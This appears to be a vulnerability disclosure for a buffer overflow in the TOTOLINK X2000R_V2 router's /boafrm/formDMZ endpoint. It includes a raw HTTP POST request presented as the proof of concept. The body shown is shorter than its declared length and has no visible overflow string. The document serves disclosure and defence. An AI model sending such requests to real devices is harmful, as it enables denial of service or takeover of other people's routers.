# Information



**Vendor of the products:** TOTOLINK

**Vendor's website:** [TOTOLINK](https://www.totolink.net/)

**Affected products:** X2000R_V2

**Affected firmware version:** V3.4.0-B20201028

**Firmware download address:** [download]([TOTOLINK](https://www.totolink.net/data/upload/20230907/a03f28573eb770f3c925b811a89f5479.rar)）

# Overview

A serious buffer overflow vulnerability was found on the TOTOLINK X2000R_V2 router. An attacker can send a malicious HTTP POST request through the route /boafrm/formDMZ to perform a denial of service attack or even execute arbitrary commands.

# POC

```
POST /boafrm/formDMZ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1146
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/wlsecurity.htm
Priority: u=0

sessionCheck=5252f6d6ab99c70f63f354c1caceab76&submit-url=http:&save=b&save_apply=c&enabled=1

```
